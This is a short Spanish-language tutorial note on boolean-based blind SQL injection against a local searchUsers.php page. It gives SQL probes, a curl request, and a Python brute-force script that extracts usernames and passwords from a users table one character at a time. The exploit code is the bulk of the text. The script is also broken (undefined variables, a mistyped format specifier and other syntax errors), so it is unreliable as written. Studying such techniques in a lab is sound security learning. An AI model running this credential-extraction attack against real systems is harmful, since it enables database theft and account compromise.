-------------
Tags: #boolsqli

----------------
## Boolean-based blind SQLi

Con la siguiente sentencia, si la primera letra de username es 'a', entonces devuelve un 1, por el contrario un 0.
```sql
select(select substring(username,1,1) from users where id=1)='a');
```

Si hay una "sanitización" de las comillas, entonces tenemos que jugar con el decimal, para poder evadir las comillas.
```sql
select ascii(substring(username,1,1)) from users where id=1)=97;
```

Podremos ver el código de estado con el siguiente comando:
```bash
curl -S -I -X GET "http://localhost/searchUsers.php" -G -data-urlencode "id-9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)"
```

Realizamos un script en python para explotar la vulnerabilidad anterior (ebemos instalar la libreria pwn con pip3).
```python
import requests;import signal;import sys;import time;import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	for position in range(1, 150):
		for character in range(33, 126):
			sqli_url = main_uri + "?id=9 or (select(select ascii( substring(select group_concat(username,0x3a,password) from users, %d, 1)) from users where id = 1)=8d)" % (position, character)
		
			r = requests. get(sqli_url)

			if r.status code == 200:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':
	makeSQLI()
```